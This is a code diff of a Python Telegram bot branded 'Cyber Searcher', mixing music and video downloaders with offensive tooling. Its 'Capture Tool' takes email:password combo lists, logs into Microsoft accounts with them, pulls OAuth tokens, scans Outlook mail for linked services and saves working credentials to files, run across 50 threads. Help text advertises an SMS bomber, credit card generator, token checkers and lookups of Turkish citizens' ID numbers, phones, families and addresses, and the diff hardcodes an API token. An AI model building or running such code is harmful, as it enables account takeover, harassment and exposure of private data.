     if len(parts) < 2:
         bot_instance.reply_to(
             msg,
-            "🎵 **Müzik İndirici (MP3)**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "🎵 **Müzik İndirici**\n"
+            "━━━━━━━━━━━━━━━━━━━━━\n"
             "📌 **Kullanım:**\n"
             "`/sarki Sanatçı Şarkı`\n"
-            "`/sarki https://youtube.com/...`\n\n"
+            "`/sarki https://youtube.com/...`\n"
             "🎯 **Örnekler:**\n"
             "`/sarki Tarkan Dudu`\n"
-            "`/sarki Hadise Feryat`\n\n"
-            "📁 Format: `.mp3` (192 kbps)"
+            "`/sarki Hadise Feryat`\n"
+            "📁 Format: `.mp3` (ffmpeg varsa) / `.m4a`"
         )
         return
 
     sorgu = parts[1].strip()
     durum = bot_instance.reply_to(msg, f"🔍 `{sorgu}` aranıyor...")
-
+    
     try:
         bot_instance.edit_message_text(
-            f"🎧 **MP3 İndiriliyor...**\n\n`{sorgu}`",
+            f"🎧 **İndiriliyor...**\n`{sorgu}`\n<i>Bu işlem 30-60 saniye sürebilir.</i>",
             msg.chat.id, durum.message_id
         )
-
         result = _muzik_indir(sorgu)
-
         if not result["ok"]:
             bot_instance.edit_message_text(
                 result.get("error", "❌ Bilinmeyen hata!"),
@@ -979,7 +781,7 @@ def _process_music(msg, bot_instance):
         sanatci = result["uploader"]
         sure = result["duration"]
         sure_txt = f"{int(sure//60)}:{int(sure%60):02d}" if sure else "?"
-
+        
         thumb_path = None
         if result.get("thumbnail"):
             try:
@@ -990,12 +792,13 @@ def _process_music(msg, bot_instance):
             except:
                 thumb_path = None
 
+        ext = os.path.splitext(result["path"])[1].replace(".", "") or "m4a"
         caption = (
             f"🎵 **{baslik}**\n"
             f"━━━━━━━━━━━━━━━━━━━━━\n"
             f"👤 **Sanatçı:** {sanatci}\n"
             f"⏱ **Süre:** {sure_txt}\n"
-            f"💽 **Format:** `.mp3` (192 kbps)\n"
+            f"💽 **Format:** `.{ext}`\n"
             f"🔗 [YouTube'da Aç]({result['url']})"
         )
 
@@ -1014,23 +817,21 @@ def _process_music(msg, bot_instance):
             finally:
                 if thumb_file:
                     thumb_file.close()
-
-        try:
-            os.remove(result["path"])
-        except:
-            pass
-        if thumb_path and os.path.exists(thumb_path):
-            try:
-                os.remove(thumb_path)
-            except:
-                pass
-
+                try:
+                    os.remove(result["path"])
+                except:
+                    pass
+                if thumb_path and os.path.exists(thumb_path):
+                    try:
+                        os.remove(thumb_path)
+                    except:
+                        pass
+        
         try:
             bot_instance.delete_message(msg.chat.id, durum.message_id)
         except:
             pass
-
-        print(f"✅ MP3 GÖNDERİLDİ | {get_user_name(uid)} | {baslik}")
+        print(f"✅ MÜZİK GÖNDERİLDİ | {get_user_name(uid)} | {baslik}")
 
     except Exception as e:
         print(f"[MUSIC ERROR] {e}")
@@ -1042,11 +843,81 @@ def _process_music(msg, bot_instance):
         except:
             bot_instance.reply_to(msg, f"❌ Hata: `{e}`")
 
+# ══════════════════════════════════════════════════════════════
+#  🎥 VİDEO İNDİRİCİ (POT PROVIDER İLE)
+# ══════════════════════════════════════════════════════════════
+def _download_video(link):
+    os.makedirs("downloads", exist_ok=True)
+    ydl_opts = _ytdlp_common_opts()
+    ydl_opts.update({
+        "format": "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best",
+        "outtmpl": os.path.join("downloads", "%(id)s.%(ext)s"),
+        "max_filesize": 50 * 1024 * 1024,
+    })
+    try:
+        with YoutubeDL(ydl_opts) as ydl:
+            info = ydl.extract_info(link, download=True)
+            if "requested_downloads" in info and info["requested_downloads"]:
+                path = info["requested_downloads"][0]["filepath"]
+            else:
+                path = ydl.prepare_filename(info)
+            
+            if not os.path.exists(path):
+                base, _ = os.path.splitext(path)
+                for ext in [".mp4", ".mkv", ".webm"]:
+                    if os.path.exists(base + ext):
+                        path = base + ext
+                        break
+            
+            if not os.path.exists(path):
+                return {"ok": False, "err": "İndirilen video dosyası bulunamadı."}
+            
+            size = os.path.getsize(path)
+            if size > 50 * 1024 * 1024:
+                os.remove(path)
+                return {"ok": False, "err": f"Video boyutu ({size / (1024*1024):.1f}MB) Telegram'ın 50MB bot limitini aşıyor."}
+            
+            return {
+                "ok": True,
+                "path": path,
+                "title": info.get("title", "Video"),
+                "size": f"{size / (1024 * 1024):.1f}MB",
+                "dur": info.get("duration", "?"),
+                "upl": info.get("uploader", "?")
+            }
+    except Exception as e:
+        return {"ok": False, "err": str(e)}
+
+def _process_video(msg, bot_instance):
+    uid = msg.from_user.id
+    link = msg.text.strip()
+    if not link.startswith(("http://", "https://")):
+        bot_instance.reply_to(msg, s(uid, "invalid_link"))
+        return
+    
+    sm = bot_instance.reply_to(msg, s(uid, "video_wait"))
+    res = _download_video(link)
+    if not res["ok"]:
+        bot_instance.edit_message_text(s(uid, "video_err", err=res["err"]), msg.chat.id, sm.message_id)
+        return
+    
+    cap = s(uid, "video_caption", title=res["title"][:60], size=res["size"], dur=res["dur"], upl=res["upl"])
+    try:
+        with open(res["path"], "rb") as f:
+            bot_instance.send_video(msg.chat.id, f, caption=cap, supports_streaming=True, timeout=120)
+    except Exception as e:
+        bot_instance.edit_message_text(f"❌ Gönderme hatası: {e}", msg.chat.id, sm.message_id)
+    finally:
+        if os.path.exists(res["path"]):
+            os.remove(res["path"])
+        try:
+            bot_instance.delete_message(msg.chat.id, sm.message_id)
+        except:
+            pass
 
 # ══════════════════════════════════════════════════════════════
 #  CAPTURE TOOL
 # ══════════════════════════════════════════════════════════════
-
 CAPTURE_APPS = {
     1: 'security@facebookmail.com',
     2: 'security@mail.instagram.com',
@@ -1077,6 +948,7 @@ CAPTURE_NAMES = {
     16: "Microsoft", 17: "Steam", 18: "Roblox", 19: "EA Sports", 20: "Bitkub"
 }
 
+CAPTURE_KEYWORDS = list(CAPTURE_NAMES.values())
 CAPTURE_RUNNING = False
 CAPTURE_LOCK = threading.Lock()
 CAPTURE_RESULTS = {}
@@ -1084,18 +956,15 @@ CAPTURE_HIT = 0
 CAPTURE_BAD = 0
 CAPTURE_PROCESSED = 0
 
-
 def capture_keyboard(user_id):
     mk = InlineKeyboardMarkup(row_width=2)
     is_prem = is_premium(user_id)
-
     mk.add(_sep("📸 PLATFORM SEÇİNİZ"))
-
     if is_prem:
         mk.add(_btn("📸 Tüm Platformlar ⭐", "capture_all"))
     else:
         mk.add(_btn("📸 Tüm Platformlar 🔒 (Premium)", "noop"))
-
+    
     for i in range(1, 21, 2):
         if i + 1 <= 20:
             mk.add(
@@ -1104,14 +973,13 @@ def capture_keyboard(user_id):
             )
         else:
             mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"))
-
+            
     if not is_prem:
         mk.add(_sep(f"📊 Kalan Hakkınız: {get_capture_limit_text(user_id)}/{FREE_CAPTURE_LIMIT}"))
         mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
-
+    
     mk.add(_btn("◀️ Geri", "goto_hotmail"))
     return mk
-
 
 def capture_get_token(email, password):
     try:
@@ -1141,9 +1009,9 @@ def capture_get_token(email, password):
         url = response.text.split("urlPost:'")[1].split("'")[0]
         ppft = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
         ad = response.url.split('haschrome=1')[0]
-
+        
         data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
-
+        
         login_headers = {
             "Host": "login.live.com",
             "Connection": "keep-alive",
@@ -1164,15 +1032,14 @@ def capture_get_token(email, password):
             "Accept-Language": "en-US,en;q=0.9",
             "Cookie": f"MSPRequ={cookies['MSPRequ']};uaid={cookies['uaid']}; RefreshTokenSso={cookies['RefreshTokenSso']}; MSPOK={cookies['MSPOK']}; OParams={cookies['OParams']}; MicrosoftApplicationsTelemetryDeviceId={uuid}"
         }
-
+        
         res = requests.post(url, data=data, headers=login_headers, allow_redirects=False)
         cookies = res.cookies.get_dict()
         headers = res.headers
-
+        
         if any(key in cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
             code = headers.get('Location', '').split('code=')[1].split('&')[0] if 'code=' in headers.get('Location', '') else None
             cid = cookies.get('MSPCID', '').upper()
-
             if code and cid:
                 token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                 token_data = {
@@ -1190,7 +1057,6 @@ def capture_get_token(email, password):
     except:
         return None, None
 
-
 def capture_get_info(email, password, token, cid, target_app=None):
     try:
         headers = {
@@ -1205,10 +1071,9 @@ def capture_get_info(email, password, token, cid, target_app=None):
             "Accept-Encoding": "gzip"
         }
         r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers).json()
-
         name = r.get('names', [{}])[0].get('displayName', 'Bilinmiyor')
         location = r.get('accounts', [{}])[0].get('location', 'Bilinmiyor')
-
+        
         url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
         headers2 = {
             "Host": "outlook.live.com",
@@ -1232,12 +1097,12 @@ def capture_get_info(email, password, token, cid, target_app=None):
             "accept-language": "en-US,en;q=0.9"
         }
         rese = requests.post(url, headers=headers2, data="").text
-
+        
         found_apps = []
         for num, app_mail in CAPTURE_APPS.items():
             if app_mail in rese:
                 found_apps.append(CAPTURE_NAMES[num])
-
+                
         return {
             "success": True,
             "name": name,
@@ -1249,39 +1114,34 @@ def capture_get_info(email, password, token, cid, target_app=None):
     except:
         return {"success": False}
 
-
 def capture_worker(line, user_id, user_name, is_premium, target_app=None):
     global CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
-
     try:
         if ":" not in line:
             with CAPTURE_LOCK:
                 CAPTURE_BAD += 1
                 CAPTURE_PROCESSED += 1
             return
-
+            
         email, password = line.split(":", 1)
         email = email.strip()
         password = password.strip()
-
         if not email or not password:
             with CAPTURE_LOCK:
                 CAPTURE_BAD += 1
                 CAPTURE_PROCESSED += 1
             return
-
+            
         token, cid = capture_get_token(email, password)
         if not token or not cid:
             with CAPTURE_LOCK:
                 CAPTURE_BAD += 1
                 CAPTURE_PROCESSED += 1
             return
-
+            
         result = capture_get_info(email, password, token, cid, target_app)
-
         if result.get("success"):
             apps = result.get("apps", [])
-
             if target_app:
                 target_name = None
                 for num, app_mail in CAPTURE_APPS.items():
@@ -1293,22 +1153,21 @@ def capture_worker(line, user_id, user_name, is_premium, target_app=None):
                         CAPTURE_BAD += 1
                         CAPTURE_PROCESSED += 1
                     return
-
+                    
             with CAPTURE_LOCK:
                 CAPTURE_HIT += 1
                 if user_id not in CAPTURE_RESULTS:
                     CAPTURE_RESULTS[user_id] = []
                 CAPTURE_RESULTS[user_id].append(result)
-
-                with open(f"capture_hits_{user_id}.txt", "a", encoding="utf-8") as f:
-                    f.write(f"Email: {email}\n")
-                    f.write(f"Password: {password}\n")
-                    f.write(f"Name: {result.get('name')}\n")
-                    f.write(f"Country: {result.get('country')}\n")
-                    f.write(f"Apps: {', '.join(apps)}\n")
-                    f.write(f"{'-'*40}\n")
-
-                print(f"✅ CAPTURE HIT | {user_name} | {email}")
+                
+            with open(f"capture_hits_{user_id}.txt", "a", encoding="utf-8") as f:
+                f.write(f"Email: {email}\n")
+                f.write(f"Password: {password}\n")
+                f.write(f"Name: {result.get('name')}\n")
+                f.write(f"Country: {result.get('country')}\n")
+                f.write(f"Apps: {', '.join(apps)}\n")
+                f.write(f"{'-'*40}\n")
+            print(f"✅ CAPTURE HIT | {user_name} | {email}")
         else:
             with CAPTURE_LOCK:
                 CAPTURE_BAD += 1
@@ -1319,23 +1178,20 @@ def capture_worker(line, user_id, user_name, is_premium, target_app=None):
         with CAPTURE_LOCK:
             CAPTURE_PROCESSED += 1
 
-
 def start_capture_scan(combo_list, user_id, user_name, is_premium, target_app=None):
     global CAPTURE_RUNNING, CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED
-
     with CAPTURE_LOCK:
         CAPTURE_RUNNING = True
         CAPTURE_HIT = 0
         CAPTURE_BAD = 0
         CAPTURE_PROCESSED = 0
         CAPTURE_RESULTS[user_id] = []
-
+    
     try:
         with ThreadPoolExecutor(max_workers=50) as executor:
             futures = []
             for line in combo_list[:1000]:
                 futures.append(executor.submit(capture_worker, line, user_id, user_name, is_premium, target_app))
-
             for future in as_completed(futures):
                 try:
                     future.result()
@@ -1345,11 +1201,186 @@ def start_capture_scan(combo_list, user_id, user_name, is_premium, target_app=No
         with CAPTURE_LOCK:
             CAPTURE_RUNNING = False
 
+# ══════════════════════════════════════════════════════════════
+#  LANGUAGE HELPERS
+# ══════════════════════════════════════════════════════════════
+def lang(user_id):
+    l = db_get(user_id, "language")
+    return l if l in ("tr", "en", "ar") else "tr"
+
+def s(user_id, key, **kw):
+    l = lang(user_id)
+    txt = S.get(l, S["tr"]).get(key, key)
+    return txt.format(**kw) if kw else txt
+
+# ══════════════════════════════════════════════════════════════
+#  STRINGS (f-string KULLANILMAMALI!)
+# ══════════════════════════════════════════════════════════════
+S = {
+    "tr": {
+        "welcome": "🌟 <b>Cyber Searcher</b>\nHoşgeldin, <b>{name}</b>!\n📌 Durum: {status}\n🔻 Aşağıdan işlem seç:",
+        "free": "🆓 Ücretsiz",
+        "premium": "⭐ PREMIUM",
+        "select_op": "🛠 Kullanmak istediğin aracı seç:",
+        "combo_ask": "🌐 Domain gir (Örn: netflix.com) veya (netflix.com 100):",
+        "searching": "🔍 <b>{domain}</b> taranıyor...",
+        "no_result": "❌ {domain} için sonuç bulunamadı.",
+        "combo_caption": "✅ <b>{domain}</b> | <b>{count}</b> Hesap\nAPI: {apis}",
+        "stats_title": "📊 <b>İSTATİSTİKLERİN</b>",
+        "profile_title": "👤 <b>PROFİL</b>",
+        "lb_title": "🏆 <b>LİDER TABLOSU</b>",
+        "help_title": "📖 <b>YARDIM MENÜSÜ</b>",
+        "no_stats": "📊 Henüz hiç sorgu yapmadınız!",
+        "api_title": "⚙️ <b>API DEĞİŞTİR</b>\n📌 Mevcut: <b>{cur}</b>\nBir API seç:",
+        "api_set": "✅ API → <b>{api}</b>",
+        "lang_pick": "🌍 Dil seçin / Select language / اختر لغتك",
+        "lang_ok": "✅ Dil seçildi!",
+        "premium_title": "⭐ <b>PREMIUM ÜYELİK</b>",
+        "premium_price_txt": "💰 Fiyat: <b>{price} Telegram Yıldızı</b>",
+        "premium_dur": "♾️ Süre: <b>Sınırsız (Ömür Boyu)</b>",
+        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n• 📧 Sınırsız Hotmail Check\n• 📸 Sınırsız Capture (20 Platform)\n• 🔖 Sınırsız Keyword\n• 🌍 Sınırsız OSINT (LeakSights)\n• 📊 Detaylı istatistikler",
+        "osint_price": "💰 OSINT Premium: 200 Yıldız",
+        "already_premium": "⭐ Zaten Premium üyesiniz!",
+        "prem_ok": "🎉 <b>Premium aktif!</b>",
+        "buy_premium_btn": "⭐ Premium Satın Al (400⭐)",
+        "buy_osint_btn": "🌍 OSINT Premium Satın Al (200⭐)",
+        "back_btn": "◀️ Geri",
+        "home_btn": "🏠 Ana Menü",
+        "tools_btn": "🛠 Araçlar",
+        "premium_req": "🔒 Premium gerekli!",
+        "video_ask": "🎥 Video linkini gönder:",
+        "video_wait": "⏳ İndiriliyor...",
+        "video_err": "❌ İndirilemedi:\n<code>{err}</code>",
+        "video_caption": "🎥 <b>{title}</b>\n📦 {size}  ⏱ {dur}s  👤 {upl}",
+        "invalid_link": "❌ Geçerli bir link gir!",
+        "ls_ask": "{icon} <b>LeakSights — {tool}</b>\n📥 Sorgu değerini gir:",
+        "ls_caption": "📋 LeakSights ⭐\n🔍 Aranan: <code>{val}</code>\n📅 {date}",
+        "tr_ask": "{prompt}\n📌 Sonuç TXT olarak gelir.",
+        "tr_caption": "📋 {tool} Sorgu\n🔍 Param: <code>{param}</code>\n📅 {date}",
+        "processing": "🔄 Sorgulanıyor...",
+        "admin_only": "❌ Bu komut sadece admin içindir!",
+        "no_data": "❌ Veri alınamadı.",
+        "given_ok": "✅ Premium verildi: @{user}",
+        "removed_ok": "✅ Premium kaldırıldı: @{user}",
+        "user_nf": "❌ Kullanıcı bulunamadı!",
+        "enter_val": "Değeri gir:",
+        "invalid_tc": "❌ Geçersiz TC (11 haneli sayı olmalı)!",
+        "invalid_gsm": "❌ Geçersiz GSM (10 haneli)!",
+        "invalid_adsoyad": "❌ Ad ve Soyad gir!",
+        "invalid_adaparsel": "❌ İl,İlçe formatında gir!",
+        "multi_bot_list": "🤖 <b>BOT LİSTESİ</b>",
+        "multi_bot_running": "🟢 Çalışıyor",
+        "multi_bot_stopped": "🔴 Durduruldu",
+        "multi_bot_total": "📊 Toplam: {count} bot",
+        "multi_bot_added": "✅ Bot başlatıldı!\n🔑 Token: `{token}`\n👤 Sahip: {owner}\n📌 Durum: 🟢 Çalışıyor",
+        "multi_bot_removed": "✅ Bot durduruldu!\n🔑 Token: `{token}`",
+        "multi_bot_not_found": "❌ Token `{token}` bulunamadı!",
+        "multi_bot_exists": "⚠️ Bu token zaten çalışıyor!",
+        "multi_bot_no_bots": "📭 Hiç bot kaydı bulunamadı.",
+        "multi_bot_add_usage": "❌ Kullanım: /addbot BOT_TOKEN\nÖrnek: /addbot 8369544888:ABC123...",
+        "addbot_tool": "🤖 Bot Ekle",
+        "announce_title": "📢 <b>ADMIN DUYURU</b>",
+        "announce_sent": "✅ Duyuru gönderildi!",
+        "announce_usage": "❌ Kullanım: /duyuru MESAJ",
+        "announce_no_users": "❌ Gönderilecek kullanıcı bulunamadı.",
+        "announce_failed": "❌ Duyuru gönderilirken hata oluştu.",
+        "php2py": "🐍 PHP'den Python'a Çevirici\nBana bir PHP dosyası gönder, Python'a çevireyim.",
+        "php2py_converting": "🔄 Çeviriliyor...",
+        "php2py_done": "✅ Tamamlandı!",
+        "php2py_error": "❌ Çeviri sırasında hata oluştu:\n{err}",
+        "php2py_only": "❌ Sadece PHP dosyası gönder!",
+        "php2py_no_token": "❌ API token alınamadı.",
+        "help_content": (
+            "📖 **YARDIM MENÜSÜ**\n"
+            "📌 Durumunuz: {status}\n"
+            "══════════════════════\n"
+            "🔹 **SORGU SİSTEMLERİ** (🆓 ÜCRETSİZ):\n"
+            "   • 🆔 TC Sorgu\n"
+            "   • 🔍 TC Pro Sorgu\n"
+            "   • 👤 Ad Soyad Sorgu\n"
+            "   • 👨‍👩‍👧 Aile Sorgu\n"
+            "   • 👨‍👩‍👧‍👦 Aile Pro Sorgu\n"
+            "   • 🌳 Sülale Sorgu\n"
+            "   • 📱 TC'den GSM\n"
+            "   • 📞 GSM'den TC\n"
+            "   • 🚗 Plaka Sorgu\n"
+            "   • 🎓 E-Okul Sorgu\n"
+            "   • 🏠 Tapu Sorgu\n"
+            "   • 🗺️ Ada Parsel Sorgu\n"
+            "   • 🏠 Adres Sorgu (YENİ!) ✅\n"
+            "🔹 **⭐ PREMIUM PAKETLER:**\n"
+            "   • 🌟 Premium (400 Yıldız) → Sınırsız Hotmail + Capture + Keyword\n"
+            "   • 🌍 OSINT Premium (200 Yıldız) → LeakSights OSINT (30+ Sorgu)\n"
+            "   • /premium ile satın alabilirsin\n"
+            "🔹 **DİĞER ARAÇLAR** (🆓 ÜCRETSİZ):\n"
+            "   • 📦 Combo Çekme\n"
+            "   • 🎥 Video İndirme (Sağlam ✅)\n"
+            "   • 🎵 Müzik İndirme (Sağlam ✅)\n"
+            "   • 💳 CC Generator\n"
+            "   • 🤖 Discord Token Kontrol\n"
+            "   • ✈️ Telegram Token Kontrol\n"
+            "   • 🌐 IP Bilgi\n"
+            "   • 🔎 DNS Sorgu\n"
+            "   • ⚽ Bahis Sorgu\n"
+            "   • 💊 Eczane Sorgu\n"
+            "   • 🛡️ Proxy Check\n"
+            "   • 🔍 URL Scan\n"
+            "   • 🐍 PHP→Python Çevirici\n"
+            "   • 💣 SMS Bomber - 41+ Servis ✅\n"
+            "   • 📧 Hotmail Checker - Free 3000 satır\n"
+            "   • 📸 Capture Tool - Free 3 kullanım\n"
+            "   • 📸 EXIF Metadata Analizi ✅\n"
+            "🔹 **PROFİL:**\n"
+            "   • 👤 Profil\n"
+            "   • 📊 İstatistik\n"
+            "   • 🏆 Lider Tablosu\n"
+            "   • ⚙️ API Değiştir\n"
+            "👨‍💻 coded by: @hackledin"
+        ),
+    },
+    "en": {
+        "welcome": "🌟 <b>Cyber Searcher</b>\nWelcome, <b>{name}</b>!\n📌 Status: {status}\n🔻 Select an option:",
+        "free": "🆓 Free",
+        "premium": "⭐ PREMIUM",
+        "osint_price": "💰 OSINT Premium: 200 Stars",
+        "help_content": (
+            "📖 **HELP MENU**\n"
+            "📌 Your Status: {status}\n"
+            "══════════════════════\n"
+            "🔹 **⭐ PREMIUM PACKAGES:**\n"
+            "   • 🌟 Premium (400 Stars) → Unlimited Hotmail + Capture + Keyword\n"
+            "   • 🌍 OSINT Premium (200 Stars) → LeakSights OSINT (30+ Queries)\n"
+            "🔹 **OTHER TOOLS:**\n"
+            "   • 💣 SMS Bomber - 41+ Services ✅\n"
+            "   • 📧 Hotmail Checker - Free 3000 lines\n"
+            "   • 📸 Capture Tool - Free 3 uses\n"
+            "   • 📸 EXIF Metadata Analysis ✅\n"
+            "   • 🎵 Music Downloader (POT ✅)\n"
+            "   • 🎥 Video Downloader (POT ✅)\n"
+            "   • 🌍 LeakSights OSINT - Premium (200⭐)\n"
+            "👨‍💻 coded by: @hackledin"
+        ),
+    },
+    "ar": {
+        "welcome": "🌟 <b>Cyber Searcher</b>\nمرحباً، <b>{name}</b>!\n📌 الحالة: {status}\n🔻 اختر خياراً:",
+        "free": "🆓 مجاني",
+        "premium": "⭐ بريميوم",
+        "osint_price": "💰 OSINT بريميوم: 200 نجمة",
+        "help_content": (
+            "📖 **قائمة المساعدة**\n"
+            "📌 حالتك: {status}\n"
+            "══════════════════════\n"
+            "🔹 **⭐ باقات البريميوم:**\n"
+            "   • 🌟 بريميوم (400 نجمة) → غير محدود Hotmail + Capture + Keyword\n"
+            "   • 🌍 OSINT بريميوم (200 نجمة) → LeakSights OSINT (30+ استعلام)\n"
+            "👨‍💻 coded by: @hackledin"
+        ),
+    },
+}
 
 # ══════════════════════════════════════════════════════════════
 #  KEYBOARDS
 # ══════════════════════════════════════════════════════════════
-
 def main_kb(user_id):
     l = lang(user_id)
     labels = {
@@ -1362,52 +1393,46 @@ def main_kb(user_id):
     mk.add(*[KeyboardButton(b) for b in btns])
     return mk
 
-
 def _btn(txt, cd):
     return InlineKeyboardButton(txt, callback_data=cd)
-
 
 def _sep(txt):
     return InlineKeyboardButton(f"─── {txt} ───", callback_data="noop")
 
-
 def hotmail_keyboard(user_id):
     mk = InlineKeyboardMarkup(row_width=2)
-
     keywords = get_user_keywords(user_id)
     limit_text = get_keyword_limit_text(user_id)
     is_prem = is_premium(user_id)
-
+    
     mk.add(_sep("📧 HOTMAIL CHECKER"))
     if is_prem:
         mk.add(_btn("🚀 Hotmail Tarama Başlat ⭐", "hotmail_start"))
     else:
         mk.add(_btn("📧 Hotmail Tarama Başlat (3000 satır)", "hotmail_start"))
-
+        
     mk.add(_sep(f"🔖 KEYWORDLER ({len(keywords)}/{limit_text})"))
-
     for kw in keywords[:10]:
         mk.add(_btn(f"📌 {kw}", "noop"))
-
+        
     mk.add(_btn("➕ Keyword Ekle", "hotmail_addkw"))
     mk.add(_btn("🗑️ Keyword Sil", "hotmail_delkw"))
     mk.add(_btn("🔄 Keywordleri Sıfırla", "hotmail_resetkw"))
-
+    
     mk.add(_sep("📸 CAPTURE TOOL"))
     if is_prem:
         mk.add(_btn("📸 Capture Tarama Başlat ⭐", "capture_menu"))
     else:
         capture_left = get_capture_limit_text(user_id)
         mk.add(_btn(f"📸 Capture Tool ({capture_left} kullanım)", "capture_menu"))
-
+        
     if is_prem:
         mk.add(_btn("⭐ Premium Aktif ✅", "noop"))
     else:
         mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
-
+        
     mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
     return mk
-
 
 API_LIST = [
     {"name": "Wazely API", "url": "https://wazely.vercel.app/api/trlog?site=", "type": "wazely"},
@@ -1429,15 +1454,14 @@ TURKIYE_API = {
     "eokul": {"url": "https://ajaxsystems.fun/eokul.php?tc={tc}", "icon": "🎓", "tr": "E-Okul Sorgu", "en": "E-School Query", "ar": "استعلام المدرسة", "params": ["tc"]},
     "tapu": {"url": "https://ajaxsystems.fun/tapu.php?tc={tc}", "icon": "🏠", "tr": "Tapu Sorgu", "en": "Title Deed Query", "ar": "استعلام الملكية", "params": ["tc"]},
     "adaparsel": {"url": "https://ajaxsystems.fun/adaparsel.php?il={il}&ilce={ilce}", "icon": "🗺️", "tr": "Ada Parsel", "en": "Block Parcel", "ar": "استعلام القطعة", "params": ["il", "ilce"]},
+    "adres": {"url": "https://apiv2.ajaxsystems.fun/adres.php?tc={tc}", "icon": "🏠", "tr": "Adres Sorgu (Tapu & Adres)", "en": "Address Query (Title & Address)", "ar": "استعلام العنوان", "params": ["tc"]},
 }
 
 LS_TOKEN = "NHLpkXyN8Lq3AkkjA5yECyMu5lpA0l0GqnY0Co8kBwh9eIeOJg"
 LS_BASE = "https://api.leaksights.com/osint"
 
-
 def _lsurl(endpoint):
     return f"{LS_BASE}/{endpoint}?token={LS_TOKEN}&text={{value}}"
-
 
 LEAKSIGHTS_API = {
     "username": {"url": _lsurl("username"), "icon": "👤", "cat": "username", "tr": "Kullanıcı Adı", "en": "Username", "ar": "اسم المستخدم"},
@@ -1509,12 +1533,12 @@ TOOL_PROMPTS = {
         "plaka": "🚗 Plaka girin (Örn: 34ABC123):",
         "proxycheck": "🛡️ IP adresini girin (Örn: 8.8.8.8):",
         "urlscan": "🔍 Domain girin (Örn: google.com):",
-        "addbot": "🤖 Bot Token'ını girin:\n\nÖrnek: 8369544888:ABC123...",
+        "addbot": "🤖 Bot Token'ını girin:\nÖrnek: 8369544888:ABC123...",
         "php2py": "🐍 PHP dosyası gönder, Python'a çevireyim.",
-        "smsbomb": "💣 SMS Bomber\n\n📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\nÖrnek: 5306524123",
-        "hotmail": "📧 Hotmail Checker\n\nLütfen combo dosyasını (email:password) gönderin.",
-        "exif": "📸 EXIF Metadata Analizi\n\nLütfen bir fotoğraf gönderin.",
-        "music": "🎵 Müzik İndirici\n\nŞarkı adı veya YouTube linki girin."
+        "smsbomb": "💣 SMS Bomber\n📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\nÖrnek: 5306524123",
+        "hotmail": "📧 Hotmail Checker\nLütfen combo dosyasını (email:password) gönderin.",
+        "exif": "📸 EXIF Metadata Analizi\nLütfen bir fotoğraf gönderin.",
+        "music": "🎵 Müzik İndirici\nŞarkı adı veya YouTube linki girin."
     },
     "en": {
         "bedrock": "🎮 Enter IP:PORT (e.g., bee.mc-complex.com:19132)",
@@ -1528,12 +1552,12 @@ TOOL_PROMPTS = {
         "plaka": "🚗 Enter plate (e.g., 34ABC123):",
         "proxycheck": "🛡️ Enter IP address (e.g., 8.8.8.8):",
         "urlscan": "🔍 Enter domain (e.g., google.com):",
-        "addbot": "🤖 Enter Bot Token:\n\nExample: 8369544888:ABC123...",
+        "addbot": "🤖 Enter Bot Token:\nExample: 8369544888:ABC123...",
         "php2py": "🐍 Send PHP file, I'll convert to Python.",
-        "smsbomb": "💣 SMS Bomber\n\n📱 Enter target number (10 digits, no leading 0):\nExample: 5306524123",
-        "hotmail": "📧 Hotmail Checker\n\nPlease send combo file (email:password).",
-        "exif": "📸 EXIF Metadata Analysis\n\nPlease send a photo.",
-        "music": "🎵 Music Downloader\n\nEnter song name or YouTube link."
+        "smsbomb": "💣 SMS Bomber\n📱 Enter target number (10 digits, no leading 0):\nExample: 5306524123",
+        "hotmail": "📧 Hotmail Checker\nPlease send combo file (email:password).",
+        "exif": "📸 EXIF Metadata Analysis\nPlease send a photo.",
+        "music": "🎵 Music Downloader\nEnter song name or YouTube link."
     },
     "ar": {
         "bedrock": "🎮 أدخل IP:PORT",
@@ -1549,10 +1573,10 @@ TOOL_PROMPTS = {
         "urlscan": "🔍 أدخل النطاق:",
         "addbot": "🤖 أدخل توكن البوت:",
         "php2py": "🐍 أرسل ملف PHP، سأحوله إلى Python.",
-        "smsbomb": "💣 قنبلة SMS\n\n📱 أدخل رقم الهدف (10 أرقام):",
-        "hotmail": "📧 Hotmail Checker\n\nيرجى إرسال ملف كومبو (email:password).",
-        "exif": "📸 تحليل بيانات EXIF\n\nيرجى إرسال صورة.",
-        "music": "🎵 تحميل الموسيقى\n\nأدخل اسم الأغنية أو رابط YouTube."
+        "smsbomb": "💣 قنبلة SMS\n📱 أدخل رقم الهدف (10 أرقام):",
+        "hotmail": "📧 Hotmail Checker\nيرجى إرسال ملف كومبو (email:password).",
+        "exif": "📸 تحليل بيانات EXIF\nيرجى إرسال صورة.",
+        "music": "🎵 تحميل الموسيقى\nأدخل اسم الأغنية أو رابط YouTube."
     },
 }
 
@@ -1569,6 +1593,7 @@ TURKEY_PROMPTS = {
         "eokul": "🎓 TC Kimlik Numarası girin (11 haneli):",
         "tapu": "🏠 TC Kimlik Numarası girin (11 haneli):",
         "adaparsel": "🗺️ İl,İlçe girin (Örn: İSTANBUL,KADIKÖY):",
